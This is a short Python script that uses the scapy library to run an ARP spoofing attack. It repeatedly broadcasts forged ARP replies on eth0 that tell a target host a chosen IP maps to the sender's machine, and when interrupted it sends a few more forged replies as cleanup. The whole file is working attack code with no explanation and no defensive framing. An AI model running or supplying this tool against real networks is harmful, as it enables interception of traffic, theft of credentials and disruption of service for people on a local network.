#!/usr/bin/python

import sys
import time
from scapy.all import sniff, sendp, ARP, Ether
import atexit
import os

def main():
	if len(sys.argv) < 3:
    		print sys.argv[0] + " <target> <spoof_ip>"
    		sys.exit(0)

	iface = "eth0"
	target_ip = sys.argv[1]
	fake_ip = sys.argv[2]

	ethernet = Ether()
	arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
	packet = ethernet / arp

	while True:
    		sendp(packet, iface=iface)
    		time.sleep(2)



try:
	main()
except KeyboardInterrupt:
	print ('Cleaning up......')
	iface = "eth0"
	target_ip = sys.argv[1]
	fake_ip = sys.argv[2]

	ethernet = Ether()
	arp = ARP(pdst=fake_ip, psrc=target_ip, op="is-at")
	packet = ethernet / arp

	for x in range(3):
    		sendp(packet, iface=iface)
    		time.sleep(2)
	try:
		sys.exit(0)
	except SystemExit:
		raise SystemExit


